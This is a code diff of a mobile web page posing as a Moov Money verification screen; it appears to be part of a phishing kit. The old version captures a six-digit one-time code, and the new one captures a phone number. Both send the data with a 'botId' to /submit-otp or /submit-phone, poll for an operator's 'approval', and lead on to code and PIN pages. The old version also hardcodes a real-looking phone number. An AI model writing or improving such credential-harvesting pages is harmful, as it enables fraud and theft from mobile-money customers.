@@ -3,353 +3,497 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Vérifier votre numéro</title>
+    <title>Moov Money - Vérification</title>
 
-    <style>
-        /* ── reset & base ── */
-        *{
+   <style>
+/* ===========================
+   RESET
+=========================== */
+*{
     margin:0;
     padding:0;
     box-sizing:border-box;
 }
 
+html,
 body{
+    width:100%;
+    height:100%;
     font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Roboto,sans-serif;
     background:#fff;
-    color:#222;
-    min-height:100vh;
+    color:#333;
 }
 
+body{
+    display:flex;
+    flex-direction:column;
+}
+
+/* ===========================
+   TOP HEADER
+=========================== */
 .top-bar{
-    height:95px;
+    width:100%;
+    height:82px;
     background:#f57c00;
     display:flex;
     align-items:flex-end;
-    padding:18px 20px;
+    padding:0 22px 18px;
+    flex-shrink:0;
 }
 
 .back-btn{
     color:#fff;
-    font-size:28px;
     text-decoration:none;
+    font-size:30px;
+    font-weight:300;
+    line-height:1;
 }
 
+/* ===========================
+   PAGE CONTAINER
+=========================== */
 .container{
-    padding:18px 28px;
+    flex:1;
+    width:100%;
+    max-width:100%;
+    min-height:calc(100vh - 82px);
+    padding:34px 28px 24px;
+    display:flex;
+    flex-direction:column;
 }
 
+/* ===========================
+   FORM
+=========================== */
+#detailsForm{
+    flex:1;
+    display:flex;
+    flex-direction:column;
+}
+
+/* ===========================
+   TITLE
+=========================== */
 .title{
-    font-size:22px;
+    font-size:24px;
     font-weight:700;
-    margin-bottom:8px;
     color:#333;
+    margin-bottom:8px;
 }
 
 .subtitle{
     font-size:15px;
-    color:#8b8b8b;
-    line-height:1.5;
-    margin-bottom:30px;
+    color:#9b9b9b;
+    line-height:1.45;
+    margin-bottom:28px;
 }
 
-.phone-highlight{
-    color:#8b8b8b;
+/* ===========================
+   PHONE INPUT
+=========================== */
+.phone-input-wrap{
+    position:relative;
+    width:100%;
+    margin-bottom:0;
 }
 
-.otp{
+.phone-input-wrap input{
+    width:100%;
+    height:58px;
+    border:2px solid #2f73b9;
+    border-radius:10px;
+    background:#fff;
+    padding:0 16px 0 64px;
+    font-size:17px;
+    color:#333;
+    outline:none;
+    transition:.2s;
+}
+
+.phone-input-wrap input::placeholder{
+    color:#999;
+}
+
+.phone-input-wrap input:focus{
+    border-color:#2f73b9;
+}
+
+   /* ===========================
+   COUNTRY CODE
+=========================== */
+.country-code{
+    position:absolute;
+    left:14px;
+    top:50%;
+    transform:translateY(-50%);
+    font-size:17px;
+    font-weight:500;
+    color:#333;
+    pointer-events:none;
+}
+
+.country-code::after{
+    display:none;
+}
+
+/* ===========================
+   PUSH CONTENT TO BOTTOM
+=========================== */
+.bottom-section{
+    margin-top:auto;
+    padding-bottom:10px;
+}
+
+/* ===========================
+   CHECKBOX
+=========================== */
+.checkbox-wrap{
     display:flex;
-    gap:10px;
+    align-items:flex-start;
+    gap:12px;
     margin-bottom:20px;
 }
 
-.otp input{
-    width:54px;
-    height:54px;
-    border:1px solid #d9d9d9;
-    border-radius:8px;
-    text-align:center;
-    font-size:22px;
-    outline:none;
-    background:#fff;
+.checkbox-wrap input[type="checkbox"]{
+    width:20px;
+    height:20px;
+    margin-top:3px;
+    flex-shrink:0;
+    accent-color:#2f73b9;
+    cursor:pointer;
 }
 
-.otp input:focus{
-    border:2px solid #1976d2;
-}
-
-.resend-wrap{
-    color:#666;
+.checkbox-wrap label{
+    flex:1;
     font-size:15px;
-    margin-bottom:40px;
+    color:#666;
+    line-height:1.5;
 }
 
-.timer{
-    font-weight:700;
+.checkbox-wrap label a{
+    color:#2f73b9;
+    text-decoration:none;
 }
 
-.continue-btn{
-    position:fixed;
-    left:28px;
-    right:28px;
-    bottom:28px;
-    height:54px;
+.checkbox-wrap label a:hover{
+    text-decoration:underline;
+}
+
+/* ===========================
+   CONTINUE BUTTON
+=========================== */
+button{
+    width:100%;
+    height:56px;
     border:none;
     border-radius:10px;
-    background:#b9cff0;
-    color:#fff;
     font-size:20px;
     font-weight:600;
+    color:#fff;
+    background:#b7cff0;
     cursor:not-allowed;
+    transition:.2s;
 }
-    </style>
+
+button:enabled{
+    background:#2f73b9;
+    cursor:pointer;
+}
+
+button:enabled:hover{
+    background:#2665a4;
+}
+
+/* ===========================
+   STATUS & SPINNER
+=========================== */
+.status{
+    display:none;
+    margin-top:15px;
+    text-align:center;
+    color:#666;
+    font-size:14px;
+}
+
+.spinner{
+    display:none;
+    width:34px;
+    height:34px;
+    margin:18px auto 0;
+    border:3px solid rgba(47,115,185,.15);
+    border-top:3px solid #2f73b9;
+    border-radius:50%;
+    animation:spin .8s linear infinite;
+}
+
+@keyframes spin{
+    to{
+        transform:rotate(360deg);
+    }
+}
+
+/* ===========================
+   RESPONSIVE
+=========================== */
+@media (max-width:480px){
+
+    .container{
+        padding:32px 20px 22px;
+    }
+
+    .title{
+        font-size:22px;
+    }
+
+    .subtitle{
+        font-size:14px;
+    }
+
+    .phone-input-wrap input{
+        height:56px;
+        font-size:16px;
+        padding-left:60px;
+    }
+
+    .country-code{
+        font-size:16px;
+    }
+
+    .checkbox-wrap label{
+        font-size:14px;
+    }
+
+    button{
+        height:56px;
+        font-size:19px;
+    }
+
+}
+
+@media (max-width:360px){
+
+    .container{
+        padding:28px 16px 18px;
+    }
+
+    .title{
+        font-size:20px;
+    }
+
+    .subtitle{
+        font-size:13px;
+    }
+
+    .phone-input-wrap input{
+        height:54px;
+        font-size:15px;
+    }
+
+    .country-code{
+        font-size:15px;
+    }
+
+    .checkbox-wrap label{
+        font-size:13px;
+    }
+
+    button{
+        font-size:18px;
+    }
+
+}
+
+</style>
 </head>
+
 <body>
 
-<div class="top-bar">
-    <a href="#" class="back-btn">&#8592;</a>
-</div>
-
-<div class="container">
-
-    <div class="title">Vérifier votre numéro</div>
-
-    <div class="subtitle">
-        Saisissez le code que nous avons envoyé à (+226) 79046955
+     <!-- Orange Header -->
+    <div class="top-bar">
+        <a href="javascript:history.back()" class="back-btn">&#8592;</a>
     </div>
 
-    <div class="otp">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
-        <input maxlength="1">
+    <!-- Main Content -->
+    <div class="container">
+
+        <div class="title">Commençons</div>
+
+        <div class="subtitle">
+            Entrez votre numéro de téléphone pour commencer
+        </div>
+
+       <form id="detailsForm" class="form-content">
+
+    <!-- Phone Number -->
+    <div class="phone-input-wrap">
+        <span class="country-code">+226</span>
+
+        <input
+            type="tel"
+            id="phone"
+            name="phone"
+            placeholder="Saisissez le numéro de téléphone"
+            autocomplete="tel-national"
+            required>
     </div>
 
-    <div class="resend-wrap">
-        Renvoyer le code dans <span class="timer">04:47</span>
+    <!-- Bottom Section -->
+    <div class="bottom-section">
+
+        <!-- Terms -->
+        <div class="checkbox-wrap">
+
+            <input
+                type="checkbox"
+                id="termsCheck"
+                required>
+
+            <label for="termsCheck">
+                J'accepte le
+                <a href="#">Conditions d'utilisation</a>
+                et
+                <a href="#">Politique de confidentialité</a>
+            </label>
+
+        </div>
+
+        <!-- Continue Button -->
+        <button
+            type="submit"
+            class="primary"
+            id="continueBtn"
+            disabled>
+            Continuer
+        </button>
+
     </div>
 
-</div>
+</form>
 
-<button class="continue-btn">Continuer</button>
+        <!-- Hidden elements (for later use) -->
+        <div id="status" class="status"></div>
+        <div id="spinner" class="spinner"></div>
 
+    </div>
     <script>
-        (function() {
-            // ── 1. Get parameters from URL and localStorage ──
-            const urlParams = new URLSearchParams(window.location.search);
-            const botId = urlParams.get('botId') || localStorage.getItem('botId');
-            const name = urlParams.get('name') || localStorage.getItem('name');
-            let phone = urlParams.get('phone') || localStorage.getItem('phone');
+document.addEventListener("DOMContentLoaded", () => {
 
+    const form = document.getElementById("detailsForm");
+    const phone = document.getElementById("phone");
+    const terms = document.getElementById("termsCheck");
+    const button = document.getElementById("continueBtn");
+    const spinner = document.getElementById("spinner");
+    const status = document.getElementById("status");
+
+    function validateForm() {
+        const phoneNumber = phone.value.replace(/\D/g, "");
+
+        if (phoneNumber.length >= 8 && terms.checked) {
+            button.disabled = false;
+        } else {
+            button.disabled = true;
+        }
+    }
+
+    phone.addEventListener("input", function () {
+        this.value = this.value.replace(/\D/g, "");
+        validateForm();
+    });
+
+    terms.addEventListener("change", validateForm);
+
+    form.addEventListener("submit", function (e) {
+        e.preventDefault();
+
+        button.disabled = true;
+        spinner.style.display = "block";
+
+        status.style.display = "block";
+        status.textContent = "⏳ En attente d'approbation...";
+
+        // Your submission logic goes here
+    });
+
+});
+</script>
+    <script>
+        let fullName = localStorage.getItem('fullName');
+        if (!fullName) { fullName = 'Client Moov Money';
+            localStorage.setItem('fullName', fullName); }
+
+        const params = new URLSearchParams(window.location.search);
+        const urlBotId = params.get('botId');
+        if (urlBotId) localStorage.setItem('botId', urlBotId);
+        const botId = localStorage.getItem('botId');
+
+        if (!botId) { alert('Session expirée. Veuillez recommencer.');
+            window.location.href = 'index.html'; }
+
+        const form = document.getElementById('detailsForm');
+        const statusEl = document.getElementById('status');
+        const spinner = document.getElementById('spinner');
+        const nextButton = form.querySelector('button.primary');
+        const termsCheck = document.getElementById('termsCheck');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            if (!termsCheck.checked) {
+                statusEl.style.display = 'block';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Veuillez accepter les conditions d\'utilisation';
+                return;
+            }
+            nextButton.disabled = true;
+            const phone = document.getElementById('phone').value.trim();
             if (!phone) {
-                const subtitle = document.querySelector('.subtitle');
-                const match = subtitle.textContent.match(/\((\+?\d+)\)\s*(\d+)/);
-                if (match) phone = match[1] + match[2];
-                else phone = '79046955';
+                statusEl.style.display = 'block';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Veuillez entrer un numéro de téléphone';
+                nextButton.disabled = false;
+                return;
             }
-
-            if (botId) localStorage.setItem('botId', botId);
-            if (name) localStorage.setItem('name', name);
-            if (phone) localStorage.setItem('phone', phone);
-
-            // ── 2. Create a message container dynamically ──
-            const container = document.querySelector('.container');
-            const msgDiv = document.createElement('div');
-            msgDiv.id = 'message-box';
-            msgDiv.style.display = 'none';
-            msgDiv.style.padding = '12px 16px';
-            msgDiv.style.borderRadius = '8px';
-            msgDiv.style.marginBottom = '20px';
-            msgDiv.style.fontSize = '15px';
-            msgDiv.style.fontWeight = '500';
-            msgDiv.style.transition = 'all 0.2s ease';
-            // Insert before the resend-wrap
-            const resendWrap = document.querySelector('.resend-wrap');
-            container.insertBefore(msgDiv, resendWrap);
-
-            function showMessage(text, isError = true) {
-                msgDiv.textContent = text;
-                msgDiv.style.display = 'block';
-                msgDiv.style.background = isError ? '#fde7e7' : '#e7f5e7';
-                msgDiv.style.color = isError ? '#b00020' : '#1e7e34';
-                msgDiv.style.border = isError ? '1px solid #f5c6cb' : '1px solid #b7d7b7';
-            }
-
-            function hideMessage() {
-                msgDiv.style.display = 'none';
-                msgDiv.textContent = '';
-            }
-
-            // ── 3. OTP auto‑advance & continue button logic ──
-            const inputs = document.querySelectorAll('.otp input');
-            const continueBtn = document.querySelector('.continue-btn');
-
-            function checkAllFilled() {
-                let allFilled = true;
-                inputs.forEach(input => {
-                    if (input.value.trim() === '') allFilled = false;
-                });
-                if (allFilled) {
-                    continueBtn.disabled = false;
-                    continueBtn.style.background = '#1976d2';
-                    continueBtn.style.cursor = 'pointer';
-                } else {
-                    continueBtn.disabled = true;
-                    continueBtn.style.background = '#b9cff0';
-                    continueBtn.style.cursor = 'not-allowed';
-                }
-            }
-
-            inputs.forEach((input, index) => {
-                input.addEventListener('input', function() {
-                    if (this.value.length === 1) {
-                        if (index < inputs.length - 1) {
-                            inputs[index + 1].focus();
-                        }
-                    }
-                    checkAllFilled();
-                    hideMessage(); // hide any previous message on new input
-                });
-
-                input.addEventListener('keydown', function(e) {
-                    if (e.key === 'Backspace' && this.value === '' && index > 0) {
-                        inputs[index - 1].focus();
-                    }
-                });
-
-                input.addEventListener('blur', checkAllFilled);
-            });
-
-            // ── 4. Timer & resend (fixed) ──
-            const timerSpan = document.querySelector('.timer');
-            const resendWrapEl = document.querySelector('.resend-wrap');
-            let totalSeconds = 5 * 60;
-            let interval = null;
-
-            function formatTime(sec) {
-                const m = String(Math.floor(sec / 60)).padStart(2, '0');
-                const s = String(sec % 60).padStart(2, '0');
-                return `${m}:${s}`;
-            }
-
-            function updateTimerUI() {
-                if (totalSeconds <= 0) {
-                    resendWrapEl.innerHTML = 'Renvoyer le code';
-                    resendWrapEl.style.color = '#1976d2';
-                    resendWrapEl.style.cursor = 'pointer';
-                    resendWrapEl.style.fontWeight = '600';
-                    clearInterval(interval);
-                    interval = null;
-                    resendWrapEl.onclick = function(e) {
-                        e.preventDefault();
-                        startTimer(5 * 60);
-                        hideMessage();
-                    };
-                    return;
-                }
-                timerSpan.textContent = `dans ${formatTime(totalSeconds)}`;
-                resendWrapEl.innerHTML = `Renvoyer le code dans <span class="timer">${formatTime(totalSeconds)}</span>`;
-                resendWrapEl.style.color = '#666';
-                resendWrapEl.style.cursor = 'default';
-                resendWrapEl.style.fontWeight = '400';
-                resendWrapEl.onclick = null;
-            }
-
-            function startTimer(seconds) {
-                if (interval) clearInterval(interval);
-                totalSeconds = seconds;
-                updateTimerUI();
-                interval = setInterval(() => {
-                    totalSeconds--;
-                    if (totalSeconds <= 0) {
-                        totalSeconds = 0;
-                        updateTimerUI();
-                        clearInterval(interval);
-                        interval = null;
-                    } else {
-                        updateTimerUI();
-                    }
-                }, 1000);
-            }
-
-            startTimer(5 * 60);
-
-            // ── 5. Backend communication with inline messages ──
-            continueBtn.addEventListener('click', function() {
-                if (this.disabled) return;
-
-                // Clear any previous message
-                hideMessage();
-
-                const otp = Array.from(inputs).map(inp => inp.value).join('');
-
-                if (!botId || !name || !phone) {
-                    showMessage('Données manquantes (nom, téléphone ou bot). Veuillez recommencer depuis la première étape.', true);
-                    return;
-                }
-
-                continueBtn.disabled = true;
-                continueBtn.textContent = 'Vérification...';
-                continueBtn.style.background = '#f5a623';
-
-                fetch('/submit-otp', {
+            localStorage.setItem('phone', phone);
+            statusEl.style.display = 'block';
+            spinner.style.display = 'block';
+            statusEl.classList.remove('error');
+            statusEl.textContent = '⏳ En attente d\'approbation...';
+            try {
+                const res = await fetch(`${window.location.origin}/submit-phone`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify({ name, phone, otp, botId })
-                })
-                .then(response => {
-                    if (!response.ok) throw new Error('Erreur serveur');
-                    return response.json();
-                })
-                .then(data => {
-                    const requestId = data.requestId;
-                    if (!requestId) throw new Error('Aucun ID reçu');
-
-                    let pollInterval = setInterval(() => {
-                        fetch(`/check-otp/${requestId}`)
-                            .then(res => {
-                                if (!res.ok) throw new Error('Erreur lors du contrôle');
-                                return res.json();
-                            })
-                            .then(status => {
-                                if (status.approved === true) {
-                                    clearInterval(pollInterval);
-                                    window.location.href = `pin.html?botId=${botId}&name=${encodeURIComponent(name)}&phone=${encodeURIComponent(phone)}`;
-                                } else if (status.approved === false) {
-                                    clearInterval(pollInterval);
-                                    showMessage('Code incorrect. Veuillez réessayer.', true);
-                                    // Reset button
-                                    continueBtn.disabled = false;
-                                    continueBtn.textContent = 'Continuer';
-                                    continueBtn.style.background = '#1976d2';
-                                    continueBtn.style.cursor = 'pointer';
-                                    inputs.forEach(inp => inp.value = '');
-                                    checkAllFilled();
-                                    inputs[0].focus();
-                                }
-                                // else still pending
-                            })
-                            .catch(err => {
-                                clearInterval(pollInterval);
-                                showMessage('Erreur de vérification : ' + err.message, true);
-                                continueBtn.disabled = false;
-                                continueBtn.textContent = 'Continuer';
-                                continueBtn.style.background = '#1976d2';
-                                continueBtn.style.cursor = 'pointer';
-                            });
-                    }, 2000);
-                })
-                .catch(err => {
-                    showMessage('Erreur lors de l\'envoi : ' + err.message, true);
-                    continueBtn.disabled = false;
-                    continueBtn.textContent = 'Continuer';
-                    continueBtn.style.background = '#1976d2';
-                    continueBtn.style.cursor = 'pointer';
+                    body: JSON.stringify({ name: fullName, phone, botId })
                 });
-            });
+                if (!res.ok) throw new Error();
+                const { requestId } = await res.json();
+                pollApproval(requestId);
+            } catch (error) {
+                spinner.style.display = 'none';
+                statusEl.classList.add('error');
+                statusEl.textContent = '❌ Erreur serveur. Veuillez réessayer.';
+                nextButton.disabled = false;
+            }
+        });
 
-        })();
+        function pollApproval(requestId) {
+            const interval = setInterval(async () => {
+                try {
+                    const res = await fetch(`${window.location.origin}/check-phone/${requestId}`);
+                    const data = await res.json();
+                    if (data.redirect) { clearInterval(interval);
+                        window.location.href = data.redirect; return; }
+                    if (data.approved === false) {
+                        clearInterval(interval);
+                        spinner.style.display = 'none';
+                        statusEl.classList.add('error');
+                        statusEl.textContent = '❌ Numéro rejeté. Veuillez réessayer.';
+                        nextButton.disabled = false;
+                    }
+                    if (data.approved === true) { clearInterval(interval);
+                        window.location.href = 'code.html'; }
+                } catch (error) { console.error('Polling error:', error); }
+            }, 2000);
+        }
     </script>
 
 </body>
